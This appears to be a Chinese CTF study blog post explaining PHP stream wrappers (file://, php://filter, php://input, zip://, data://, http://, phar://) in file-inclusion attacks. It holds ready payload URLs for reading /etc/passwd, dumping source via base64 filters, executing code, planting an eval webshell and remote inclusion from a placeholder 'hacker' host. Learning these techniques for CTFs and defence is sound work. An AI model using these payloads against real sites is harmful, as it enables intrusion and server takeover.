---
title: PHP伪协议
date: 2025-11-21 10:25:02
tags: [PHP, CTF, 网络安全]
---

# PHP 伪协议

## `file://` 协议

### 利用条件

 - allow_url_fopen:off/on
 - allow_url_include:off/on

### 作用

使用file://协议来访问文件系统，在CTF比赛里经常用来读取文件，以此获得flag，并且不受到allow_url_fopen和allow_url_include的影响。

这里有一点，当PHP里使用include()/require()/include_once()/require_once()参数可控的情况下，如导入一个非.php的文件，依然回按照php语法进行解析，这是include()函数的结果。

> file://文件系统是PHP使用的默认封装协议，展示了本地文件系统，file://它是使用了相对路径，一般来说脚本目录在什么目录下，其的起始路径就是改目录了。除非特意对默认路径做了修改，使用CLI的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen()和file_get_contents()、include_path会可选地进行搜索，也作为相对的路径。

### 用法

file://绝对路径

```
http://target/include.php?file=file:///etc/passwd
```

相对路径

```
http://target/include.php?file=./flag.php
```

http://路径

```
http://target/include.php?file=http://127.0.0.1/phpinfo.txt
```

## `php://`协议

### 利用条件

 - allow_url_fopen:off/on
 - allow_url_include:on/off

**其中仅有php://input、php://stdin、php://memory、php://temp需要on**

### 作用

php://访问各个I/O streams, php://filter读取源代码，而php://input用来做php代码执行。

### `php://filter` 使用

该协议的参数会在该协议的路径上进行传递，多个参数都可以使用。

| 参数 | 描述 |
|-----|------|
|resource=<要过滤的数据流>|必须项。它指定了你要筛选过滤的数据流。|
|read=<读链的过滤器>|可选项。可以设定一个或多个过滤器名称|
|write=<写链的过滤器>|可选项。可以设定一个或多个过滤器名称|
|<; 两个链的过滤器>|任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链

#### 常见过滤器类型

|字符串过滤器|作用|
|----------|----|
|string.rot13|等同于str_rot13()，rot13变换|
|string.toupper|等同于strtoupper()，转大写字母|
|string.tolower|等同于strtolower()，转小写字母|
|string.strip_tags|等同于strip_tags()，去除html、PHP语言标签

|转换过滤器|作用|
|---------|----|
|convert.base64-encode & convert.base64-decode|等同于base64_encode()和base64_decode()，base64编码解码|
|convert.quoted-printable-encode & convert.quoted-printable-decode|quoted-printable 字符串与 8-bit 字符串编码解码|

|压缩过滤器|作用|
|---------|---|
|zlib.deflate & zlib.inflate|在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。|
|bzip2.compress & bzip2.decompress|同上，在本地文件系统中创建 bz2 兼容文件的方法。|

|加密过滤器|作用|
|---------|--|
|mcrypt.*|libmcrypt 对称加密算法|
|mdecrypt.*|libmcrypt 对称解密算法|

#### 基本使用

`php://filter/read=convert.base64-encode/resource=文件名`

读取文件源码（针对php文件需要base64编码）

例如：

```
http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
```

`php://input + [POST DATA]`

执行PHP代码

```php
http://127.0.0.1/include.php?file=php://input

<?php system('ls');?>
```

写入一句话代码：

```php
http://127.0.0.1/include.php?file=php://input

<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST['cmd']);?>'; ?>
```

## `zip://` & `bzip2://` & `zlib://`协议

### 利用条件

- allow_url_fopen:off/on
- allow_url_include :off/on

### 作用

zip:// & bzip2:// & zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。

### 基本使用

`zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`

*(`%23`为`#`)*

```
http://target/include.php?file=zip:///Hacking/flag.jpg%23flag.txt
```

这段代码的作用是：

通过 file= 参数，利用 PHP ZIP 封装器，从伪装的 flag.jpg（其实是 zip）里读取 flag.txt，并让 include.php 输出其中内容

- 打开 /Hacking/flag.jpg 这个 ZIP 文件，从中读取 flag.txt 内容
- 然后 `include()` 把 flag.txt 的内容当成 PHP 代码执行 / 输出

常见的用途：

1. 读取敏感文件（flag、配置文件等）

```
zip:///?file=/upload/avatar.png#flag.txt
```

2. RCE（远程代码执行）

攻击者上传 zip 内含 `shell.php` 然后包含它执行

### `compress.bzip2://file.bz2`

这个是压缩文件为file.bz2并且上传，注意也是绝对路径

```
http://target/include.php?file=compress.bzip2:///home/wanderer/phpinfo.bz2
```

### `compress.zlib://file.gz`

压缩文件为file.gz并且上传，注意也是绝对路径

```
http://target/include.php?file=compress.zlib:///home/wanderer/phpinfo.gz
```

## `data://` 协议

### 利用条件

- allow_url_fopen:on
- allow_url_include:on

### 作用

data://数据流封装器是从php5.2.0开始使用的。以此传递相应的格式的数据。经常被用来执行PHP代码。

```
data://text/plain,
data://text/plain;base64,
```

### 常见用法

```
http://target/include.php?file=data://text/plain,<?php phpinfo();?>

http://target/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

## `http://` & `https://`协议

### 利用条件

- allow_url_fopen:on
- allow_url_include:on

### 作用

允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。

### 常见用法

```
http://target/include.php?file=http://hacker/phpinfo.txt
```

## `phar://` 协议

### 作用

`phar://`协议与`zip://`类似，同样可以访问zip格式压缩包内容

http://target/include.php?file=phar:///Hacking/phpinfo.zip/phpinfo.txt

## 参考资料

https://a1andns.github.io/post/PHP伪协议 作者：A1andNS

https://zhuanlan.zhihu.com/p/686151790